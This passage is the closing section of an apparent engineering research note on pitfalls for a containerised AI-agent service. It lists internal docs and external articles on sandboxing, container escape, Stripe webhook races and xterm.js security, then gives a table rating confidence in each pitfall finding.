| Pain points: "Crons don't run weekly," "Container OOM monthly," "Lost workflow state on restart," "Manual intervention weekly" | `RELIABLE-AGENT-EXECUTION.md` §"Pain Points" table | **PRE-EMPT** | Each of these is a direct mapping into one of the critical/moderate pitfalls above. |

---

## Sources

### Internal (high signal, project-specific)
- `/Users/fcavalcanti/dev/meusecretariovirtual/docs/INFRASTRUCTURE.md` — production server config, security checklist, schema, spawn command
- `/Users/fcavalcanti/dev/meusecretariovirtual/docs/RELIABLE-AGENT-EXECUTION.md` — pain points table, pg-boss decision, durable execution patterns
- `/Users/fcavalcanti/dev/meusecretariovirtual/docs/AGENT-HEARTBEAT.md` — heartbeat thresholds, alert rate limits, debounce
- `/Users/fcavalcanti/dev/meusecretariovirtual/docs/EXECUTOR-CONTRACT.md` — idempotency keys, pending result recovery pattern

### External (verified)
- [How to sandbox AI agents in 2026: MicroVMs, gVisor & isolation strategies — Northflank](https://northflank.com/blog/how-to-sandbox-ai-agents)
- [Kata Containers vs Firecracker vs gVisor — Northflank](https://northflank.com/blog/kata-containers-vs-firecracker-vs-gvisor)
- [CVE-2025-9074: Critical Docker Container Escape (CVSS 9.3) — The Hacker News](https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html)
- [What is Container Escape: Detection & Prevention — Wiz](https://www.wiz.io/academy/container-security/container-escape)
- [9 Common Docker Container Security Vulnerabilities — Aikido](https://www.aikido.dev/blog/docker-container-security-vulnerabilities)
- [Stripe Webhooks: Solving Race Conditions and Building a Robust Credit Management System — Pedro Alonso](https://www.pedroalonso.net/blog/stripe-webhooks-solving-race-conditions/)
- [The Race Condition You're Probably Shipping Right Now With Stripe Webhooks — DEV](https://dev.to/belazy/the-race-condition-youre-probably-shipping-right-now-with-stripe-webhooks-mj4)
- [Implementing Pre-paid Usage Billing with Next.js and Stripe — Pedro Alonso](https://www.pedroalonso.net/blog/stripe-usage-credit-billing/)
- [Idempotent requests — Stripe API Reference](https://docs.stripe.com/api/idempotent_requests)
- [Container security fundamentals part 4: Cgroups — Datadog Security Labs](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-4/)
- [Resource constraints — Docker Docs](https://docs.docker.com/engine/containers/resource_constraints/)
- [Fork bomb prevention — moby/moby#6479](https://github.com/moby/moby/issues/6479)
- [xterm.js Security guide](https://xtermjs.org/docs/guides/security/)
- [xterm.js #2443: document possible security implications/pitfalls](https://github.com/xtermjs/xterm.js/issues/2443)
- [Token & Cost Tracking — Langfuse](https://langfuse.com/docs/observability/features/token-and-cost-tracking)
- [OpenRouter FAQ](https://openrouter.ai/docs/faq)

### Confidence

| Section | Confidence | Why |
|---|---|---|
| MSV-inheritance pitfalls (CRIT-2, CRIT-3, CRIT-5, CRIT-6, MOD-5) | **HIGH** | Documented in MSV's own production docs as pain points; not theoretical. |
| Container escape / sandbox (CRIT-1, CRIT-4) | **HIGH** | Confirmed by CVE-2025-9074, multiple independent sources, gVisor/Kata are standard 2025–2026 recommendations. |
| Stripe webhook race (CRIT-5) | **HIGH** | Multiple expert blog posts, Stripe's own docs require idempotency. |
| Token-counting drift (MOD-1) | **MEDIUM** | Confirmed reasoning-token divergence; "1% drift" is heuristic, not measured. |
| BYOK mode confusion (MOD-2), recipe drift (MOD-3) | **MEDIUM** | Logical inference + general experience; no published post-mortem. |
| WS/PTY pitfalls (MOD-6) | **HIGH** | xterm.js docs explicitly enumerate these. |

